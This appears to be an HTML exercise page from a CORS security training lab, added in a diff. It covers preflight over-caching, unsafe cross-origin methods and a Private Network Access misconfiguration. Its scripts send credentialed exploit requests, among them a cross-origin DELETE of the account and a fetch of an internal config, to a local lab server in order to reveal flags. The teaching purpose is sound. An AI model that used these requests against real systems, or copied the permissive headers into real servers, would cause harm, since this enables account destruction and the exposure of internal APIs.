@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ex 03 — Preflight Abuse & Private Network Access</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Courier New', monospace; background: #0a0e1a; color: #e0e6f0; padding: 2rem; }
+    h1 { color: #ff3c3c; margin-bottom: 0.25rem; }
+    .subtitle { color: #6272a4; font-size: 0.85rem; margin-bottom: 2rem; }
+    .scenario { background: #1a1225; border: 1px solid #9945ff44; border-left: 4px solid #9945ff; padding: 1rem 1.25rem; border-radius: 6px; font-size: 0.82rem; line-height: 1.6; margin-bottom: 1.5rem; color: #c0b0e0; }
+    .attack-card { background: #111827; border: 1px solid #1f2d3d; border-radius: 8px; padding: 1.25rem; margin-bottom: 1.25rem; }
+    .attack-card h2 { font-size: 0.95rem; color: #ff6b6b; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.6rem; }
+    .badge { background: #ff3c3c22; border: 1px solid #ff3c3c44; color: #ff6b6b; font-size: 0.68rem; padding: 0.15rem 0.5rem; border-radius: 3px; }
+    .new-badge { background: #3fb95022; border: 1px solid #3fb95044; color: #3fb950; font-size: 0.68rem; padding: 0.15rem 0.5rem; border-radius: 3px; }
+    .explanation { font-size: 0.8rem; color: #6272a4; line-height: 1.6; margin-bottom: 0.75rem; }
+    .preflight-flow {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 0.75rem;
+      font-size: 0.73rem;
+      margin-bottom: 0.75rem;
+      color: #8b949e;
+    }
+    .preflight-flow .step { margin-bottom: 0.25rem; }
+    .preflight-flow .arrow { color: #6272a4; }
+    .preflight-flow .req { color: #79c0ff; }
+    .preflight-flow .res { color: #3fb950; }
+    .preflight-flow .vuln { color: #ff6b6b; }
+    button { background: #ff3c3c22; border: 1px solid #ff3c3c66; color: #ff6b6b; padding: 0.45rem 1.2rem; border-radius: 4px; cursor: pointer; font-size: 0.82rem; font-family: inherit; margin-right: 0.5rem; margin-bottom: 0.25rem; }
+    button:hover { background: #ff3c3c33; }
+    .output { background: #0d1117; border-radius: 4px; padding: 0.75rem; font-size: 0.75rem; min-height: 90px; white-space: pre-wrap; word-break: break-all; margin-top: 0.75rem; color: #6272a4; border: 1px solid #21262d; }
+    .flag { background: #2d2a00; border: 1px solid #f0c93a55; color: #f0c93a; padding: 0.5rem 0.75rem; border-radius: 4px; margin-top: 0.5rem; font-weight: bold; }
+    code { background: #1f2d3d; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.85em; }
+    .timeline {
+      display: flex;
+      gap: 0.5rem;
+      align-items: center;
+      font-size: 0.73rem;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 0.6rem;
+      margin-bottom: 0.75rem;
+      flex-wrap: wrap;
+    }
+    .tl-item { background: #161b22; border: 1px solid #30363d; border-radius: 4px; padding: 0.3rem 0.5rem; }
+    .tl-item.bad { border-color: #ff6b6b44; color: #ff6b6b; }
+    .tl-item.ok { border-color: #3fb95044; color: #3fb950; }
+    .tl-arrow { color: #444; }
+    .pna-diagram {
+      background: #0d1117;
+      border: 1px solid #8be9fd44;
+      border-left: 3px solid #8be9fd;
+      border-radius: 4px;
+      padding: 0.75rem;
+      font-size: 0.75rem;
+      margin-bottom: 0.75rem;
+      color: #8b949e;
+    }
+    .pna-diagram .label { color: #8be9fd; margin-bottom: 0.4rem; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+  <h1>Exercise 03 — Preflight Abuse &amp; Private Network Access</h1>
+  <div class="subtitle">Bugs #7, #8, #9 — advanced CORS mechanics and the 2026 attack surface</div>
+
+  <div class="scenario">
+    <strong>This exercise covers:</strong> How preflight caching creates a window of
+    opportunity after a CORS fix, how listing unsafe HTTP methods in CORS headers enables
+    cross-origin CSRF, and how Chrome's Private Network Access enforcement (new in 2024-2026)
+    can be bypassed if the server responds carelessly to PNA preflights.
+  </div>
+
+  <!-- BUG #7: Preflight cache -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #7</span> Preflight Over-Cached (Max-Age: 86400)</h2>
+    <div class="explanation">
+      The OPTIONS response includes <code>Access-Control-Max-Age: 86400</code> (24 hours).
+      If a security team patches a CORS misconfiguration, any browser that cached the
+      old permissive preflight continues to use it for up to 24 hours — giving attackers
+      a long exploitation window after a "fix" is deployed.
+    </div>
+
+    <div class="timeline">
+      <div class="tl-item bad">9:00am — Bug discovered, preflight cached (24h)</div>
+      <div class="tl-arrow">→</div>
+      <div class="tl-item ok">9:05am — CORS config patched on server</div>
+      <div class="tl-arrow">→</div>
+      <div class="tl-item bad">Attacker's browser still uses cached preflight until 9:00am tomorrow</div>
+    </div>
+
+    <div class="preflight-flow">
+      <div class="step"><span class="arrow">Browser →</span> <span class="req">OPTIONS /api/settings</span> <span class="arrow">(preflight)</span></div>
+      <div class="step"><span class="arrow">Server  →</span> <span class="res">204 No Content</span></div>
+      <div class="step"><span class="vuln">          Access-Control-Max-Age: 86400  ← cached for 24h!</span></div>
+      <div class="step"><span class="arrow">Browser →</span> <span class="req">PUT /api/settings</span> <span class="arrow">(real request, no preflight needed for 24h)</span></div>
+    </div>
+
+    <button onclick="inspectPreflight()">▶ Send PUT (triggers preflight) — inspect Max-Age</button>
+    <div class="output" id="preflight-output">Click to run — then check DevTools Network tab for the OPTIONS request...</div>
+  </div>
+
+  <!-- BUG #8: Unsafe methods -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #8</span> Unsafe Methods Allowed Cross-Origin</h2>
+    <div class="explanation">
+      <code>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH</code> on the
+      DELETE endpoint means a trusted cross-origin page can trigger account deletion
+      using the victim's session cookie. This is CSRF delivered via CORS misconfiguration.
+    </div>
+
+    <div class="preflight-flow">
+      <div class="step"><span class="arrow">Browser →</span> <span class="req">OPTIONS /api/account</span></div>
+      <div class="step"><span class="vuln">Server  → Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH</span></div>
+      <div class="step"><span class="arrow">Browser →</span> <span class="req">DELETE /api/account</span> <span class="arrow">with session cookie</span></div>
+      <div class="step" style="color:#ff6b6b">          Account deleted. Victim's data gone.</div>
+    </div>
+
+    <button onclick="exploitDelete()">▶ Send cross-origin DELETE /api/account</button>
+    <div class="output" id="delete-output">Click to run...</div>
+  </div>
+
+  <!-- BUG #9: Private Network Access -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #9</span> <span class="new-badge">2026 NEW</span> Private Network Access Header Misconfiguration</h2>
+    <div class="explanation">
+      Chrome 98+ introduced <strong>Private Network Access (PNA)</strong>. When a public website
+      tries to reach a private network resource (localhost, 192.168.x.x), Chrome sends a preflight
+      with <code>Access-Control-Request-Private-Network: true</code>. The server must explicitly
+      opt in with <code>Access-Control-Allow-Private-Network: true</code>.<br><br>
+      The bug: if the server sends that header to <em>any</em> origin that asks — not just trusted
+      ones — it defeats PNA protection entirely.
+    </div>
+
+    <div class="pna-diagram">
+      <div class="label">🔒 What PNA is supposed to prevent:</div>
+      Public website (evil.com) → tries to reach http://localhost:3000/api/internal<br>
+      Chrome sends preflight with: <code>Access-Control-Request-Private-Network: true</code><br>
+      If server says: <code>Access-Control-Allow-Private-Network: true</code> without checking origin<br>
+      → Chrome allows the request → internal API exposed to any public website
+    </div>
+
+    <button onclick="testPNA()">▶ Send PNA preflight to /api/internal</button>
+    <button onclick="exploitPNA()">▶ Fetch /api/internal (with PNA header)</button>
+    <div class="output" id="pna-output">Click to run... (open DevTools to see the preflight headers)</div>
+  </div>
+
+  <script>
+    async function inspectPreflight() {
+      const el = document.getElementById('preflight-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Sending PUT /api/settings (non-simple method — triggers OPTIONS preflight)...\n' +
+        'Open DevTools → Network → find the OPTIONS request → check response headers.\n\n';
+
+      try {
+        const start = performance.now();
+        const res = await fetch('http://localhost:3000/api/settings', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ notification: 'enabled' }),
+          credentials: 'include',
+        });
+        const duration = (performance.now() - start).toFixed(0);
+        const data = await res.json();
+
+        const maxAge = res.headers.get('access-control-max-age');
+        const acao   = res.headers.get('access-control-allow-origin');
+        const methods = res.headers.get('access-control-allow-methods');
+
+        el.style.color = '#f0c93a';
+        el.textContent +=
+          'Request completed in ' + duration + 'ms.\n\n' +
+          'CORS headers on response:\n' +
+          '  Access-Control-Allow-Origin:  ' + acao + '\n' +
+          '  Access-Control-Allow-Methods: ' + methods + '\n' +
+          '  Access-Control-Max-Age:       ' + (maxAge || 'not set') + '\n\n';
+
+        if (maxAge && parseInt(maxAge) > 300) {
+          el.textContent +=
+            '⚠️  Max-Age is ' + maxAge + ' seconds (' + (parseInt(maxAge)/3600).toFixed(1) + ' hours).\n' +
+            'This preflight result will be cached until tomorrow.\n' +
+            'A CORS fix deployed now won\'t take effect for cached browsers.\n\n';
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG visible in response: ' + data.flag;
+          el.after(f);
+        } else {
+          el.textContent += '✅ Max-Age is short (' + maxAge + 's) — Bug #7 is fixed.';
+        }
+        el.textContent += '\nServer response:\n' + JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += 'Blocked: ' + err.message;
+      }
+    }
+
+    async function exploitDelete() {
+      const el = document.getElementById('delete-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Sending cross-origin DELETE /api/account (non-simple method — preflight first)...\n' +
+        'Watch for OPTIONS then DELETE in DevTools Network tab.\n\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/account', {
+          method: 'DELETE',
+          credentials: 'include',
+        });
+        const methods = res.headers.get('access-control-allow-methods');
+        const data = await res.json();
+
+        el.style.color = '#ff6b6b';
+        el.textContent +=
+          '🔥 Cross-origin DELETE succeeded!\n\n' +
+          'Access-Control-Allow-Methods: ' + methods + '\n\n' +
+          'The server listed DELETE as a cross-origin-allowed method.\n' +
+          'This enables CSRF via CORS — the victim\'s session cookie was sent.\n\n' +
+          'Response:\n' + JSON.stringify(data, null, 2);
+        if (data.flag) {
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          el.after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += '✅ Blocked: ' + err.message + '\n\nBug #8 fixed — DELETE not in Allow-Methods.';
+      }
+    }
+
+    async function testPNA() {
+      const el = document.getElementById('pna-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Sending OPTIONS preflight with Access-Control-Request-Private-Network: true...\n\n' +
+        'Note: Chrome auto-adds this header — we simulate it here.\n';
+
+      try {
+        // Simulate what Chrome does internally for PNA
+        const res = await fetch('http://localhost:3000/api/internal', {
+          method: 'OPTIONS',
+          headers: {
+            'Access-Control-Request-Method': 'GET',
+            'Access-Control-Request-Private-Network': 'true',
+          },
+        });
+        const apn = res.headers.get('access-control-allow-private-network');
+        const acao = res.headers.get('access-control-allow-origin');
+
+        el.textContent +=
+          'Preflight response:\n' +
+          '  Status: ' + res.status + '\n' +
+          '  Access-Control-Allow-Origin: ' + acao + '\n' +
+          '  Access-Control-Allow-Private-Network: ' + (apn || 'not set') + '\n\n';
+
+        if (apn === 'true') {
+          el.style.color = '#ff6b6b';
+          el.textContent +=
+            '⚠️  Server sent Allow-Private-Network: true without validating origin!\n' +
+            'Any public website can now reach this "private" endpoint.\n' +
+            'This defeats Chrome\'s PNA protection entirely.\n\n' +
+            'Fix: only send this header when origin is in the trusted allowlist.';
+        } else {
+          el.style.color = '#3fb950';
+          el.textContent += '✅ PNA header not returned — Bug #9 fixed.';
+        }
+      } catch (err) {
+        el.textContent += 'Request error: ' + err.message;
+      }
+    }
+
+    async function exploitPNA() {
+      const el = document.getElementById('pna-output');
+      el.style.color = '#6272a4';
+      el.textContent = 'Fetching /api/internal (Chrome adds PNA preflight automatically for localhost)...\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/internal', { credentials: 'include' });
+        const data = await res.json();
+        el.style.color = '#ff6b6b';
+        el.textContent +=
+          '⚠️  Access to internal endpoint granted!\n\n' +
+          'Internal config leaked:\n' + JSON.stringify(data, null, 2);
+        if (data.flag) {
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          el.after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += '✅ Blocked: ' + err.message +
+          '\n\nEither Bug #9 is fixed, or Chrome\'s PNA enforcement blocked the request.\n' +
+          'Open DevTools → Console for the exact browser error.';
+      }
+    }
+  </script>
+</body>
+</html>
